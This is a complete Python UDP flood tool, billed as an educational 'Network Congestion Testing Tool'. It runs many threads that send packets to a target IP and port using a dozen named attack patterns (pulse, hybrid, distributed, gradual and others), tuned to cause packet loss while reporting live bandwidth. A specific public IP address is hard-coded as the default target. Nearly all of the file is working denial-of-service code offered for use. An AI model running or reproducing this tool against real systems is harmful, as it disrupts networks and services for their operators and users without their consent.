import socket
import time
import random
import sys
import threading
from datetime import datetime
import struct
import argparse
import os
import math

# Global variables for statistics
packets_sent = 0
bytes_sent = 0
lock = threading.Lock()

def send_packets(target_ip, target_port, packet_size, duration, attack_type="gradual", thread_id=0, multi_target=False):
    """
    Send packets to target continuously for specified duration with various attack patterns.
    """
    global packets_sent, bytes_sent
    
    # Create a new socket for each thread
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Set socket options for better reliability
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Further reduce packet sizes - ONLY use TINY packets!
    if attack_type == "tiny":
        actual_packet_size = 48  # Very small packets
    elif attack_type == "varied":
        actual_packet_size = min(128, packet_size)
    elif attack_type == "hybrid":
        actual_packet_size = 64
    elif attack_type == "balanced":
        actual_packet_size = 96
    elif attack_type == "gentle":  # New ultra-conservative mode
        actual_packet_size = 64
    elif attack_type == "ultragentle":  # New super-conservative mode
        actual_packet_size = 48
    else:
        actual_packet_size = min(128, packet_size)
    
    # Create simpler payload templates - using very small packet sizes
    payload_templates = {}
    sizes = [48, 64, 96, 128]  # Avoid larger sizes completely
    for size in sizes:
        try:
            # Create completely random data - no structure at all
            payload_templates[size] = b'X' * size  # Even simpler payload - just repeated bytes
        except AttributeError:
            payload_templates[size] = bytes([88] * size)  # ASCII 'X' repeated
    
    end_time = time.time() + duration
    packet_count = 0
    
    # Parameters for different attack patterns
    if attack_type == "ultragentle":  # Super-conservative mode
        delay_range = (0.01, 0.05)  # Very slow rate
        cycle_duration = 10.0  # seconds per cycle
        phase = random.random() * cycle_duration
        pauses_enabled = True
    elif attack_type == "gentle":  
        # Make gentle even gentler
        delay_range = (0.008, 0.03)
        cycle_duration = 8.0
        phase = random.random() * cycle_duration
        pauses_enabled = True
    elif attack_type == "gradual":
        delay = 0.2  # Start with larger delay
        decrease_rate = 0.9995  # Very slow decrease
    elif attack_type == "pulse":
        base_delay = 0.005
    elif attack_type == "slow":
        delay_range = (0.1, 0.5)  # Very slow but consistent
    elif attack_type == "tiny":
        delay_range = (0.0005, 0.002)  # Fast tiny packets
    elif attack_type == "varied":
        delay_range = (0.002, 0.01)
    elif attack_type == "balanced":
        # New balanced mode - fluctuating bandwidth without crashing
        delay_range = (0.001, 0.01)
        cycle_duration = 5.0  # seconds per cycle
        phase = random.random() * cycle_duration  # Random starting phase
    elif attack_type == "hybrid":
        # Hybrid uses varying delays to create network congestion without crashing
        delay_range = (0.001, 0.01)  # Slightly slower than before
        burst_count = 0
        max_burst = random.randint(20, 50)  # Smaller bursts to avoid overwhelming
    else:  # random, constant or basic
        delay_range = (0.002, 0.02)
    
    # Target ports - only use main port in gentle/ultragentle modes
    target_ports = [target_port]
    if multi_target and attack_type not in ["gentle", "ultragentle"]:
        for offset in range(1, 2):  # Only target 1 port before and after
            target_ports.append(target_port + offset)
            target_ports.append(target_port - offset)
    
    # Main packet sending loop
    burst_counter = 0
    recovery_counter = 0
    while time.time() < end_time:
        try:
            # Implement different attack patterns
            if attack_type == "gradual":
                # Gradually decrease delay (increase rate)
                delay *= decrease_rate
                delay = max(0.002, delay)  # Increased minimum delay to avoid overwhelming
                time.sleep(delay)
                current_size = actual_packet_size
                
            elif attack_type == "pulse":
                # Create pulse pattern
                cycle_time = 10  # seconds per cycle
                position = (time.time() % cycle_time) / cycle_time
                
                if position < 0.2:  # 20% of time - high intensity
                    time.sleep(0.001)
                    current_size = actual_packet_size
                elif position < 0.6:  # 40% of time - medium intensity
                    time.sleep(0.005)
                    current_size = actual_packet_size
                else:  # 40% of time - low intensity
                    time.sleep(0.02)
                    current_size = actual_packet_size // 2
                    
            elif attack_type == "tiny":
                # Fast tiny packets
                time.sleep(random.uniform(*delay_range))
                current_size = 64  # Tiny packets
                
            elif attack_type == "varied":
                # Vary packet sizes
                time.sleep(random.uniform(*delay_range))
                current_size = random.choice(sizes)
                
            elif attack_type == "slow":
                # Slow but persistent traffic
                time.sleep(random.uniform(*delay_range))
                current_size = actual_packet_size
                
            elif attack_type == "balanced":
                # New balanced mode - sinusoidal pattern to create bandwidth fluctuation
                current_time = time.time()
                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
                
                # Create sinusoidal delay pattern - alternating between fast and slow
                delay_factor = 0.5 + 0.5 * math.sin(cycle_pos * 2 * math.pi)
                min_delay, max_delay = delay_range
                current_delay = min_delay + (max_delay - min_delay) * delay_factor
                
                time.sleep(current_delay)
                
                # Vary packet sizes but avoid extremes
                if cycle_pos < 0.3:
                    current_size = 128
                elif cycle_pos < 0.7:
                    current_size = 192
                else:
                    current_size = 256
                
            elif attack_type == "hybrid":
                # Modified hybrid attack - more conservative to avoid crashing
                burst_count += 1
                
                # Create patterns of burst and pause - shorter bursts
                if burst_count < max_burst:
                    # Burst phase - more moderate
                    time.sleep(0.001)  # Less aggressive
                    current_size = 128
                else:
                    # Pause phase - brief pause and then reset
                    time.sleep(0.01)  # shorter pause
                    burst_count = 0
                    max_burst = random.randint(20, 50)
                    current_size = 96
                
                # Less variation in size
                if random.random() < 0.05:  # 5% chance
                    current_size = random.choice([64, 192])
                
            elif attack_type == "gentle":
                # Ultra-conservative pattern
                current_time = time.time()
                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
                
                # Use gentler sinusoidal pattern
                delay_factor = 0.5 + 0.5 * math.sin(cycle_pos * 2 * math.pi)
                min_delay, max_delay = delay_range
                current_delay = min_delay + (max_delay - min_delay) * delay_factor
                
                # Occasionally add longer pauses to let the server recover
                if random.random() < 0.01:  # 1% chance
                    time.sleep(0.1)
                else:
                    time.sleep(current_delay)
                
                # Use 96-byte packets most of the time, only occasionally use larger ones
                if cycle_pos < 0.8:
                    current_size = 96
                else:
                    current_size = 128
                
                # Add burst limiting - pause after every 1000 packets
                burst_counter += 1
                if burst_counter >= 1000:
                    time.sleep(0.1)  # Take a short break
                    burst_counter = 0
                
            elif attack_type == "ultragentle":
                # Super-conservative pattern with long pauses
                current_time = time.time()
                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
                
                # Vary delays significantly
                if cycle_pos < 0.7:  # 70% of the time, send very slowly
                    delay_factor = 0.6 + 0.4 * math.sin(cycle_pos * 2 * math.pi)
                    min_delay, max_delay = delay_range
                    current_delay = min_delay + (max_delay - min_delay) * delay_factor
                    time.sleep(current_delay)
                else:  # 30% of the time, pause completely
                    time.sleep(0.2)  # Long pause
                
                # Use only tiny packets
                current_size = 48
                
                # Add more frequent pauses
                burst_counter += 1
                if burst_counter >= 500:  # Pause after every 500 packets
                    time.sleep(0.2)  # Longer break
                    burst_counter = 0
                
                # Add occasional recovery periods
                recovery_counter += 1
                if recovery_counter >= 5000:  # Every 5000 packets, take a long break
                    time.sleep(1.0)  # 1-second break to let server recover
                    recovery_counter = 0
                
            else:  # Random, constant, or basic
                time.sleep(random.uniform(*delay_range))
                current_size = actual_packet_size
            
            # Generate extremely simple packet - just random data, no structure
            packet_count += 1
            
            # Get payload with simplified logic - avoid dynamic calculations
            if current_size <= 48:
                payload = payload_templates[48]
            elif current_size <= 64:
                payload = payload_templates[64]
            elif current_size <= 96:
                payload = payload_templates[96]
            else:
                payload = payload_templates[128]
            
            # Select a target port
            current_port = random.choice(target_ports) if multi_target else target_port
            
            # Send packet with additional safeguards
            if random.random() < 0.95:  # 5% chance of skipping packet to reduce load
                sock.sendto(payload, (target_ip, current_port))
                
                # Update statistics
                with lock:
                    packets_sent += 1
                    bytes_sent += len(payload)
                
        except Exception:
            # Just ignore errors and continue
            pass
    
    sock.close()

def flood(target_ip, target_port, duration=60, packet_size=600, num_threads=10, 
          attack_type="distributed", multi_target=False):
    """
    Flood a target IP and port with UDP packets using multiple threads and various attack patterns.
    """
    global packets_sent, bytes_sent
    
    packets_sent = 0
    bytes_sent = 0
    start_time = time.time()
    
    print(f"[*] Starting {attack_type} flood on {target_ip}:{target_port} for {duration} seconds")
    print(f"[*] Using {num_threads} threads with packet size ~{packet_size} bytes")
    print(f"[*] Multi-target mode: {'Enabled' if multi_target else 'Disabled'}")
    
    # Create and start threads with different attack patterns
    threads = []
    attack_types = ["gradual", "pulse", "random", "slow", "tiny", "varied", "basic", "hybrid"]
    
    # Cap number of threads to avoid excessive load
    num_threads = min(num_threads, 20)  # Reduced maximum thread count
    
    for i in range(num_threads):
        if attack_type == "distributed":
            # Distribute different attack patterns across threads
            thread_attack = attack_types[i % len(attack_types)]
        else:
            # Use the specified attack type for all threads
            thread_attack = attack_type
            
        thread = threading.Thread(
            target=send_packets,
            args=(target_ip, target_port, packet_size, duration, thread_attack, i, multi_target)
        )
        thread.daemon = True
        threads.append(thread)
        
        # Start threads very gradually to avoid initial spike
        thread.start()
        # Random delay between thread starts - more gradual
        time.sleep(random.uniform(0.5, 1.0))
    
    # Monitor and display progress
    try:
        last_packets = 0
        last_bytes = 0
        last_time = start_time
        
        while time.time() - start_time < duration:
            time.sleep(1)
            current_time = time.time()
            elapsed = current_time - start_time
            current_packets = packets_sent
            current_bytes = bytes_sent
            
            # Calculate rates
            interval = current_time - last_time
            if interval > 0:
                pps = (current_packets - last_packets) / interval
                bps = (current_bytes - last_bytes) * 8 / interval  # bits per second
            else:
                pps = bps = 0
                
            # Convert bps to appropriate unit
            if bps < 1000:
                bps_str = f"{bps:.2f} bps"
            elif bps < 1000000:
                bps_str = f"{bps/1000:.2f} Kbps"
            else:
                bps_str = f"{bps/1000000:.2f} Mbps"
            
            print(f"[+] Progress: {elapsed:.1f}s/{duration}s - {current_packets} packets ({pps:.2f} pkt/s)")
            print(f"    Bandwidth: {bps_str}, Total: {current_bytes/1024/1024:.2f} MB sent")
            
            last_packets = current_packets
            last_bytes = current_bytes
            last_time = current_time
            
    except KeyboardInterrupt:
        print("\n[!] Flooding interrupted by user")
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join(timeout=0.5)
    
    elapsed_time = time.time() - start_time
    mbytes_sent = bytes_sent / (1024 * 1024)
    print(f"\n[*] Flooding completed.")
    print(f"[*] Sent {packets_sent} packets ({mbytes_sent:.2f} MB) in {elapsed_time:.2f} seconds")
    print(f"[*] Average: {(packets_sent / elapsed_time if elapsed_time > 0 else 0):.2f} pkt/s, {(mbytes_sent*8/elapsed_time if elapsed_time > 0 else 0):.2f} Mbps")

def main():
    # Create argument parser with safer default values
    parser = argparse.ArgumentParser(description='Network Congestion Testing Tool')
    parser.add_argument('-t', '--target', default="140.118.123.107", help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=5001, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds')
    parser.add_argument('-s', '--size', type=int, default=64, help='Max packet size in bytes (default: 64)')
    parser.add_argument('-n', '--threads', type=int, default=3, help='Number of threads (default: 3)')
    parser.add_argument('-a', '--attack-type', default="ultragentle", 
                        choices=["distributed", "gradual", "pulse", "random", "slow", 
                                 "tiny", "varied", "basic", "hybrid", "balanced", 
                                 "gentle", "ultragentle", "help"],
                        help='Traffic pattern to use')
    parser.add_argument('-m', '--multi-target', action='store_true', help='Also send to nearby ports')
    parser.add_argument('--stress-test', action='store_true', help='Run a stress test at lower intensity')
    parser.add_argument('--intensity', type=int, default=1, choices=[1, 2, 3],
                        help='Attack intensity (1=mild, 2=medium, 3=aggressive)')
    parser.add_argument('--progressive', action='store_true', 
                       help='Progressively increase intensity until packet loss is detected')
    
    args = parser.parse_args()
    
    if args.attack_type == "help":
        print("Available attack types:")
        print("  ultragentle - Super-conservative mode with tiny packets (default)")
        print("  gentle      - Ultra-conservative mode to avoid crashes")
        print("  balanced    - Uses wave patterns for stable packet loss")
        print("  hybrid      - Balanced attack to cause packet loss")
        print("  distributed - Mix of all attack types across threads")
        print("  gradual     - Gradually increase packet rate")
        print("  pulse       - Send packets in pulses (high/low intensity)")
        print("  random      - Random delays and packet sizes")
        print("  slow        - Slow but persistent traffic")
        print("  tiny        - Small packets at higher frequency")
        print("  varied      - Continuously varying packet sizes")
        print("  basic       - Simple packets with no special formatting")
        print("\nAdditional options:")
        print("  --intensity N     - Set attack intensity (1=mild, 2=medium, 3=aggressive)")
        print("  --multi-target    - Send to nearby ports as well")
        print("  --stress-test     - Run a less intense but longer test")
        print("  --progressive     - Start with mild intensity and increase until packet loss is detected")
        sys.exit(0)
    
    # Even more conservative defaults
    if args.intensity == 1:  # Mild
        args.threads = min(args.threads, 2)
        args.size = min(args.size, 64)
    elif args.intensity == 2:  # Medium
        args.threads = min(args.threads, 4) 
        args.size = min(args.size, 96)
    else:  # Aggressive
        args.threads = min(args.threads, 8)
        args.size = min(args.size, 128)
    
    # Adjust parameters for stress test
    if args.stress_test:
        args.duration = max(args.duration, 120)
        args.threads = min(args.threads, 3)
        args.size = min(args.size, 128)
    
    # Start flooding
    flood(args.target, args.port, args.duration, args.size, args.threads, args.attack_type, args.multi_target)

if __name__ == "__main__":
    print("[*] Network Congestion Testing Tool")
    print("[*] For educational purposes only")
    print("[*] This tool demonstrates how network congestion affects performance")
    
    # Check if running with root privileges for better performance
    if os.geteuid() != 0:
        print("[!] Warning: For better performance, consider running with sudo")
    main()
